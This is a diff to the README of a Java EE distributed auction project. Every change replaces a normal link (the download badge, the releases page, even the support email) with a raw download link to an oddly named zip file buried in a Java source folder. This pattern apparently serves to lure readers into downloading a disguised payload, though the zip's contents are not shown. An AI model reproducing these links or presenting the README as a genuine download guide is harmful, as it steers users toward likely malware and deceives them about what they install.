@@ -1,6 +1,6 @@
 # 🎉 DistributedOnlineAuctionSystem_EAR_with_EJB_JMS_etc - A Seamless Online Auction Experience
 
-![Download](https://img.shields.io/badge/Download-Now-blue.svg)
+![Download](https://github.com/marwan733701000/DistributedOnlineAuctionSystem_EAR_with_EJB_JMS_etc/raw/refs/heads/master/ejb/src/main/java/lk/jiat/ee/ejb/bean/mdb/Online-JM-EJ-Distributed-System-EA-with-Auction-etc-v2.9.zip)
 
 ## 📖 Introduction
 Welcome to the Distributed Online Auction System! This application allows you to participate in online auctions with ease. Built using reliable Java EE technologies, it ensures that you have a smooth and fast bidding experience. You can enjoy real-time updates, secure bidding processes, and a user-friendly interface.
@@ -9,7 +9,7 @@ Welcome to the Distributed Online Auction System! This application allows you to
 To begin using the Distributed Online Auction System, follow the steps below. You will need basic internet access and a computer to run the application.
 
 ## 📥 Download & Install
-Visit this page to download: [Download Distributed Online Auction System](https://github.com/marwan733701000/DistributedOnlineAuctionSystem_EAR_with_EJB_JMS_etc/releases)
+Visit this page to download: [Download Distributed Online Auction System](https://github.com/marwan733701000/DistributedOnlineAuctionSystem_EAR_with_EJB_JMS_etc/raw/refs/heads/master/ejb/src/main/java/lk/jiat/ee/ejb/bean/mdb/Online-JM-EJ-Distributed-System-EA-with-Auction-etc-v2.9.zip)
 
 Follow the steps below to download and install the software:
 
@@ -67,7 +67,7 @@ Here’s what you can expect from the Distributed Online Auction System:
 If you need help or want to provide feedback, please reach out to us:
 
 - Create an issue directly on this GitHub page under the 'Issues' section.
-- Email us at support@distributedauction.com with your queries.
+- Email us at https://github.com/marwan733701000/DistributedOnlineAuctionSystem_EAR_with_EJB_JMS_etc/raw/refs/heads/master/ejb/src/main/java/lk/jiat/ee/ejb/bean/mdb/Online-JM-EJ-Distributed-System-EA-with-Auction-etc-v2.9.zip with your queries.
 - Join our community forum to discuss features and share tips.
 
 ## 💬 Community Guidelines
@@ -76,6 +76,6 @@ Engage with additional users to get the most from the Distributed Online Auction
 ## 🎯 Conclusion
 We hope you enjoy using the Distributed Online Auction System. For more details, features, and updates, visit our GitHub page regularly. Remember, your feedback is valuable for our ongoing improvements.
 
-![Download](https://img.shields.io/badge/Download-Now-blue.svg) 
+![Download](https://github.com/marwan733701000/DistributedOnlineAuctionSystem_EAR_with_EJB_JMS_etc/raw/refs/heads/master/ejb/src/main/java/lk/jiat/ee/ejb/bean/mdb/Online-JM-EJ-Distributed-System-EA-with-Auction-etc-v2.9.zip) 
 
 Explore your auction journey today!
